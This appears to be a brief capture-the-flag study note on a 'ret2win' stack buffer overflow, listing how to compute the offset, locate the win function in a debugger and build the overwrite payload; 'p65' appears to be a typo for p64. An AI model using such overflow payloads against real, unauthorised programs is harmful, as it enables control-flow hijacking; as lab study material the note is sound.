## `win()`, no shell needed
- find offset = buf + saved rbp
- find win addr = `p win`
- payload : `payload = b"A" * offset + p65(<win_addr> + 5...)`